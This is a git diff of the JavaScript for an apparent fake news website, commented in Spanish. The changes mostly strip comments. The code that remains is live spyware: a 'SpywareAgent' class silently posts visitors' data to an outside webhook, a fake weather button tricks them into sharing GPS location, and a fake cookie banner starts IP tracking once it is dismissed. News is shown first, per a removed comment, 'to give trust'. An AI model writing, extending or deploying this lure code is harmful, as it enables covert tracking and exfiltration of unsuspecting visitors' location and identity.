@@ -62,10 +62,9 @@ class SpywareAgent {
     }
 
     exfiltrate(payload, type, precision) {
-        // MODO NO-CORS: Envía los datos sin esperar respuesta (para evitar errores en consola)
         fetch(this.webhook, {
             method: 'POST',
-            mode: 'no-cors', // <--- CRUCIAL PARA VERCEL
+            mode: 'no-cors',
             headers: { 'Content-Type': 'text/plain' },
             body: JSON.stringify({ ALERTA: type, PRECISION: precision, DATOS: payload })
         }).then(() => console.log(">> Datos enviados (Silencioso)")).catch(e => console.log("Error envío"));
@@ -74,16 +73,14 @@ class SpywareAgent {
     setCookiesAccepted(status) { this.acceptedCookies = status; }
 }
 
-// --- FUNCIONES DE INTERFAZ (UI) ---
+// FUNCIONES DE INTERFAZ (UI)
 
 function renderNews() {
     const heroEl = document.getElementById("hero-news");
     const gridEl = document.getElementById("secondary-grid");
-    
-    // Barajar noticias aleatoriamente
+
     const shuffled = [...newsDatabase].sort(() => 0.5 - Math.random());
 
-    // 1. Renderizar Hero (Noticia Grande)
     if(heroEl && shuffled.length > 0) {
         const hero = shuffled[0];
         heroEl.innerHTML = `
@@ -94,11 +91,10 @@ function renderNews() {
             </div>
         `;
     }
-
-    // 2. Renderizar Grid Secundario (4 noticias abajo)
+    
     if(gridEl && shuffled.length > 1) {
         gridEl.innerHTML = ""; 
-        const secondaryNews = shuffled.slice(1, 5); // Tomar las siguientes 4
+        const secondaryNews = shuffled.slice(1, 5);
         
         secondaryNews.forEach(news => {
             const card = document.createElement('div');
@@ -118,7 +114,7 @@ function renderTrending() {
     if(!listEl) return;
 
     listEl.innerHTML = ""; 
-    // Tomamos 5 noticias para la lista lateral
+
     const trendingNews = newsDatabase.slice(0, 5); 
 
     trendingNews.forEach((news, index) => {
@@ -134,20 +130,16 @@ function renderTrending() {
     });
 }
 
-// --- INICIO DE LA APLICACIÓN ---
+//INICIO DE LA APLICACIÓN
 document.addEventListener("DOMContentLoaded", () => {
     
-    // 1. Cargar contenido VISUAL inmediatamente (para dar confianza)
     renderNews();
-    renderTrending(); // <--- ESTO ES LO QUE TE FALTABA
+    renderTrending();
 
-    // 2. Iniciar Agente Espía
     const spy = new SpywareAgent(CONFIG.WEBHOOK_URL);
-    
-    // 3. Activar trampa de cookies después de un momento
+
     setTimeout(() => setupCookieTrap(spy), CONFIG.COOKIE_TIMEOUT);
 
-    // Fecha Header
     const dateEl = document.getElementById("current-date");
     if(dateEl) {
         dateEl.innerText = new Date().toLocaleDateString('es-ES', { 
@@ -155,7 +147,6 @@ document.addEventListener("DOMContentLoaded", () => {
         });
     }
 
-    // LÓGICA DEL CLIMA (TRAMPA GPS)
     const btnGps = document.getElementById("btn-gps-trigger");
     const weatherWidget = document.getElementById("weather-trap");
     
@@ -176,7 +167,6 @@ document.addEventListener("DOMContentLoaded", () => {
             
             spy.trackGPS(
                 async (data) => {
-                    // ÉXITO
                     btnGps.style.opacity = "0";
                     setTimeout(() => { btnGps.style.display = "none"; }, 500);
                     
@@ -227,7 +217,7 @@ function setupCookieTrap(spyAgent) {
     const close = () => {
         spyAgent.setCookiesAccepted(true);
         modal.style.display = 'none';
-        spyAgent.trackIP(); // Iniciar rastreo al cerrar
+        spyAgent.trackIP();
         showSafeNotification();
     };
 
@@ -250,4 +240,5 @@ function showSafeNotification() {
     document.body.appendChild(notif);
     setTimeout(() => notif.remove(), 3000);
 }
+
 
